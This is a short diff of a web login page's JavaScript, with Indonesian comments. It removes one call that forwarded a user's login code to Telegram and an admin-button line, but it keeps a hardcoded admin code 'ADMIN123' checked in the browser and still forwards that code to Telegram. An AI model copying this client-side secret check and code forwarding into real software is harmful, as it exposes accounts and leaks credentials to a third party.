@@ -155,10 +155,8 @@
             alert('Login berhasil!');
             document.getElementById('loginButton').style.display = 'none'; // Sembunyikan tombol Login
             document.getElementById('panelButton').style.display = 'inline-block'; // Tampilkan tombol Go to Panel
-            sendCodeToTelegram(code); // Kirim kode ke Telegram
         } else if (code === 'ADMIN123') {
             alert('Akses Admin diberikan!');
-            document.getElementById('adminButton').style.display = 'inline-block';
             sendCodeToTelegram(code); // Kirim kode Admin ke Telegram
         } else {
             alert('Kode salah, coba lagi.');
@@ -174,4 +172,4 @@
 </script>
 
 </body>
-    </html>
+</html>
